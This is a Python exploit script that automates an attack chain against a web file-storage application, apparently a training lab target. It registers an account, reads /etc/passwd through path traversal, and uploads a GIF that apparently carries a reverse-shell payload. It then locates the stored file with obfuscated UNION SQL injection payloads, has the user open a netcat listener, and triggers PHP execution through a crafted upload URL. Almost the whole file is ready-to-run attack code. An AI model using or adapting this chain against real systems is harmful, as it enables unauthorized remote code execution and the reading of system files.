#!/usr/bin/env python3
"""
EXACT MANUAL STEPS - Using existing reverse.gif
Target: filestore.37ethical.com
"""

import requests
import sys
import time
import random
import string
import re
import os
from urllib.parse import quote

# Configuration
TARGET = "filestore.37ethical.com"
BASE_URL = f"http://{TARGET}"
LHOST = ""
LPORT = 4444
GIF_FILE = "reverse.gif"  # Your existing GIF file

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

class ReverseShellExploit:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.username = ''.join(random.choices(string.ascii_lowercase, k=8))
        self.password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        self.uploaded_file = None
        
    def log(self, message, level="info"):
        levels = {
            "info": f"{BLUE}[*]{RESET}",
            "success": f"{GREEN}[+]{RESET}",
            "error": f"{RED}[-]{RESET}",
            "warning": f"{YELLOW}[!]{RESET}",
            "step": f"{PURPLE}[STEP]{RESET}",
        }
        prefix = levels.get(level, "[*]")
        print(f"{prefix} {message}")

    def print_step(self, step_num, description):
        """Print current step"""
        self.log(f"\n{'='*60}", "step")
        self.log(f"STEP {step_num}: {description}", "step")
        self.log(f"{'='*60}\n", "step")

    def register_and_login(self):
        """STEP 1: Register account"""
        self.print_step(1, "Register account")
        
        # Register
        reg_data = {
            'action': 'register',
            'username': self.username,
            'password': self.password,
            'confirm_password': self.password
        }
        
        try:
            self.session.post(f"{BASE_URL}/auth.php", data=reg_data, allow_redirects=True, timeout=10)
            
            # Login
            login_data = {
                'action': 'login',
                'username': self.username,
                'password': self.password
            }
            login_response = self.session.post(f"{BASE_URL}/auth.php", data=login_data, allow_redirects=True, timeout=10)
            
            if "dashboard.php" in login_response.url:
                self.log(f"✓ Logged in as: {self.username}", "success")
                return True
            else:
                self.log("✗ Login failed", "error")
                return False
        except Exception as e:
            self.log(f"Error: {e}", "error")
            return False

    def read_system_files(self):
        """STEP 2: Read system files via LFI"""
        self.print_step(2, "Read system files via LFI")
        
        try:
            url = f"{BASE_URL}/view_sample.php?file=../../../../etc/passwd"
            self.log(f"GET {url}", "info")
            response = self.session.get(url, timeout=10)
            
            if "root:x" in response.text:
                self.log("✓ Successfully read /etc/passwd", "success")
                # Show first few lines
                lines = response.text.split('\n')[:3]
                for line in lines:
                    if line.strip():
                        self.log(f"  {line[:50]}", "info")
                return True
            else:
                self.log("✗ Failed to read system files", "error")
                return False
        except Exception as e:
            self.log(f"Error: {e}", "error")
            return False

    def check_gif_file(self):
        """Check if reverse.gif exists"""
        self.print_step(3, "Check for reverse.gif")
        
        if not os.path.exists(GIF_FILE):
            self.log(f"✗ {GIF_FILE} not found in current directory!", "error")
            self.log(f"Current directory: {os.getcwd()}", "info")
            self.log("Files found:", "info")
            for f in os.listdir('.'):
                self.log(f"  {f}", "info")
            return False
        
        self.log(f"✓ Found {GIF_FILE}", "success")
        self.log(f"  File size: {os.path.getsize(GIF_FILE)} bytes", "info")
        return True

    def upload_gif(self):
        """STEP 3: Upload the GIF file"""
        self.log("\n📤 Uploading reverse.gif...", "info")
        
        try:
            with open(GIF_FILE, 'rb') as f:
                files = {'file': (GIF_FILE, f, 'image/gif')}
                response = self.session.post(f"{BASE_URL}/upload.php", files=files, allow_redirects=True, timeout=10)
            
            if "success" in response.text.lower():
                self.log("✓ GIF uploaded successfully", "success")
                return True
            else:
                self.log("✗ Upload failed", "error")
                return False
        except Exception as e:
            self.log(f"Error: {e}", "error")
            return False

    def find_uploaded_file(self):
        """STEP 4: Find uploaded file via SQL injection"""
        self.print_step(4, "Find uploaded file via SQL injection")
        
        # First SQL injection - get file paths (URL encoded version)
        sql_payload1 = "-1%09or%091=1%09UnIoN%09SeLeCt%09original_name,file_path%09FrOm%09files--"
        url1 = f"{BASE_URL}/download.php?id={sql_payload1}"
        
        self.log(f"SQLi 1: {url1[:80]}...", "info")
        try:
            response1 = self.session.get(url1, timeout=10)
            file_paths = re.findall(r'uploads/[a-f0-9_]+\.gif', response1.text)
            self.log(f"  Found {len(file_paths)} files", "info")
        except Exception as e:
            self.log(f"Error: {e}", "error")
            file_paths = []
        
        # Second SQL injection - get stored names (comment version)
        sql_payload2 = "-1/**/union/**/select/**/file_path,stored_name/**/from/**/files--"
        url2 = f"{BASE_URL}/download.php?id={sql_payload2}"
        
        self.log(f"SQLi 2: {url2[:80]}...", "info")
        try:
            response2 = self.session.get(url2, timeout=10)
            stored_files = re.findall(r'uploads/[a-f0-9_]+\.gif', response2.text)
            self.log(f"  Found {len(stored_files)} files", "info")
        except Exception as e:
            self.log(f"Error: {e}", "error")
            stored_files = []
        
        # Combine and get unique files
        all_files = list(set(file_paths + stored_files))
        
        if all_files:
            # Sort to get the newest (timestamps are at the end)
            all_files.sort()
            self.uploaded_file = all_files[-1]
            self.log(f"\n✓ NEWEST FILE: {self.uploaded_file}", "success")
            
            # Show all files for reference
            self.log("\nAll uploaded files:", "info")
            for f in all_files:
                self.log(f"  {f}", "info")
            
            return True
        else:
            self.log("✗ No files found via SQL injection", "error")
            return False

    def wait_for_listener(self):
        """STEP 5: Ask user to start netcat"""
        self.print_step(5, "Open listener on your device")
        
        print(f"\n{YELLOW}" + "="*60)
        print(f"❗ ACTION REQUIRED:")
        print(f"1. Open a NEW terminal window")
        print(f"2. Run this command:")
        print(f"{GREEN}   nc -lvnp {self.lport}{RESET}")
        print(f"3. Keep it running and return here")
        print(f"{YELLOW}" + "="*60 + f"{RESET}\n")
        
        input(f"{PURPLE}Press Enter AFTER your netcat listener is running...{RESET}")
        print()

    def trigger_shell(self):
        """STEP 6: Execute the reverse shell"""
        self.print_step(6, "Execute reverse shell")
        
        filename = self.uploaded_file.split('/')[-1]
        random_php = ''.join(random.choices(string.ascii_lowercase, k=6)) + '.php'
        
        # The exact URL pattern from manual steps
        shell_url = f"{BASE_URL}/uploads/{filename}/{random_php}"
        
        self.log(f"URL: {shell_url}", "info")
        self.log("Sending request (should hang/timeout if shell connects)...", "info")
        
        try:
            # This should timeout if shell connects
            response = requests.get(shell_url, timeout=5)
            self.log(f"Response code: {response.status_code}", "info")
            
            # 500 or 502 means PHP executed
            if response.status_code in [500, 502]:
                self.log(f"✓ HTTP {response.status_code} - PHP executed! Check netcat!", "success")
                
        except requests.exceptions.Timeout:
            self.log("✓ TIMEOUT - CHECK NETCAT FOR SHELL!", "success")
            return True
        except requests.exceptions.ConnectionError:
            self.log("✓ CONNECTION ERROR - CHECK NETCAT FOR SHELL!", "success")
            return True
        except Exception as e:
            self.log(f"Error: {e}", "error")
        
        return False

    def show_manual_urls(self):
        """Show manual URLs to try if automated fails"""
        filename = self.uploaded_file.split('/')[-1]
        self.log("\n📋 Manual URLs to try:", "warning")
        for php in ['shell.php', 'cmd.php', 'reverse.php', 'a.php', 'b.php', 'c.php', 'x.php', 'y.php', 'z.php']:
            self.log(f"  http://{TARGET}/uploads/{filename}/{php}")

    def run(self):
        """Main execution flow"""
        print(f"""
{GREEN}
╔══════════════════════════════════════════════════════════╗
║     USING EXISTING reverse.gif                           ║
║     Target: {BASE_URL}               ║
║     LHOST: {self.lhost}                                    ║
║     LPORT: {self.lport}                                          ║
║     GIF: {GIF_FILE}                                     ║
╚══════════════════════════════════════════════════════════╝
{RESET}""")
        
        # Check if reverse.gif exists
        if not self.check_gif_file():
            return False
        
        # STEP 1: Register account
        if not self.register_and_login():
            self.log("Failed at step 1", "error")
            return False
        
        # STEP 2: Read system files
        self.read_system_files()
        
        # STEP 3: Upload existing GIF
        if not self.upload_gif():
            self.log("Failed at step 3", "error")
            return False
        
        # Wait for processing
        self.log("\n⏳ Waiting 3 seconds for file processing...", "info")
        time.sleep(3)
        
        # STEP 4: Find uploaded file via SQL injection
        if not self.find_uploaded_file():
            self.log("Failed at step 4", "error")
            return False
        
        # STEP 5: Ask user to start listener
        self.wait_for_listener()
        
        # STEP 6: Trigger the shell
        shell_triggered = self.trigger_shell()
        
        # Give shell time to connect
        time.sleep(3)
        
        self.log("\n" + "="*60, "info")
        self.log("✅ CHECK YOUR NETCAT WINDOW!", "success")
        
        if not shell_triggered:
            self.show_manual_urls()
        
        return True

def main():
    if len(sys.argv) < 3:
        print(f"{RED}Usage: python3 {sys.argv[0]} YOUR_IP PORT{RESET}")
        print(f"Example: python3 {sys.argv[0]} 10.12.35.41 1111")
        print(f"\n{YELLOW}Note: Make sure reverse.gif is in the current directory!{RESET}")
        sys.exit(1)
    
    LHOST = sys.argv[1]
    LPORT = int(sys.argv[2])
    
    exploit = ReverseShellExploit(LHOST, LPORT)
    
    try:
        exploit.run()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrupted by user{RESET}")

if __name__ == "__main__":
    main()